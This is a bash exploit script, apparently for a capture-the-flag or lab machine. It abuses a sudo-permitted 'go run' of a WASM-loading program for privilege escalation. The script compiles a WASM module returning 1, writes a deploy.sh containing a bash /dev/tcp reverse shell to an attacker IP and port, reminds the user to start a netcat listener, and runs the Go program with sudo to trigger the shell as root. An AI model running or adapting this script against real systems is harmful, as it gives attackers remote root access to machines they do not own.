#!/bin/bash

# Configuration - PLS MODIFY
ATTACKER_IP="10.10.14.5"
ATTACKER_PORT="4444"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${GREEN}[+] Starting WASM exploit${NC}"

# Check if wat2wasm is available
if ! command -v wat2wasm &> /dev/null; then
    echo -e "${RED}[-] wat2wasm not found. Install WABT first:${NC}"
    echo "    sudo apt install wabt"
    exit 1
fi

# Create temporary directory
WORK_DIR="/tmp/wasm_exploit_$$"
mkdir -p "$WORK_DIR"
cd "$WORK_DIR"

echo -e "${YELLOW}[*] Creating malicious WASM file...${NC}"

# Create WAT source that returns 1
cat > info.wat << 'EOF'
(module
  (func $info (export "info") (result i32)
    i32.const 1
  )
)
EOF

# Compile to WASM
wat2wasm info.wat -o main.wasm

if [ ! -f "main.wasm" ]; then
    echo -e "${RED}[-] Failed to create main.wasm${NC}"
    exit 1
fi

echo -e "${GREEN}[+] Created main.wasm${NC}"

echo -e "${YELLOW}[*] Creating reverse shell deploy.sh...${NC}"

# Create malicious deploy.sh
cat > deploy.sh << EOF
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/${ATTACKER_IP}/${ATTACKER_PORT} 0>&1'
EOF

chmod +x deploy.sh

echo -e "${GREEN}[+] Created deploy.sh with reverse shell to ${ATTACKER_IP}:${ATTACKER_PORT}${NC}"

echo -e "${YELLOW}[*] Current directory: ${WORK_DIR}${NC}"
echo -e "${YELLOW}[*] Files created:${NC}"
ls -la

echo -e "${GREEN}[+] Starting listener reminder:${NC}"
echo -e "    ${YELLOW}nc -lvnp ${ATTACKER_PORT}${NC}"
echo ""
read -p "Press Enter when listener is ready..."

echo -e "${YELLOW}[*] Executing exploit...${NC}"

# Run the Go program from our working directory
sudo /usr/bin/go run /opt/wasm-functions/index.go

echo -e "${GREEN}[+] Exploit complete${NC}"

# Cleanup option
echo ""
read -p "Clean up temporary files? (y/n) " -n 1 -r
echo
if [[ $REPLY =~ ^[Yy]$ ]]; then
    cd /tmp
    rm -rf "$WORK_DIR"
    echo -e "${GREEN}[+] Cleanup complete${NC}"
fi
